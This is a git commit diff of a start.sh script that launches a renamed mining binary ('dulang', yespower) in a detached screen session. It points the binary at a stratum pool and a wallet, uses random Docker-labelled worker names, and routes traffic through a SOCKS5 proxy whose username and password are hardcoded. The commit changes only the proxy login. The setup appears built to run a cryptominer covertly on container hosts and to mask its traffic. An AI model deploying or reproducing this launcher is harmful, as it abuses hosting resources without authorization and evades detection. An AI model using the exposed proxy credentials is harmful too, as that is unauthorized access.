3a75764f904adf580e19b00c85867c081e011c9f
youandme12345 <68213375+youandme12345@users.noreply.github.com>
2021-06-30 09:44:10 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://stratum-eu.rplant.xyz:3350
 WALLET=VQEPqKj8wS8pSKXjLnCWEhgXkAXNQgEQoa.kuy
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
-PROXY=socks5://woiden_kido2:aing1234@163.172.214.196:8080
+PROXY=socks5://woiden_kidonew90:aing1234@163.172.214.196:8080
 ./dulang -a yespower -o $POOL -u $WALLET -p $WORKER -t 2 -x $PROXY
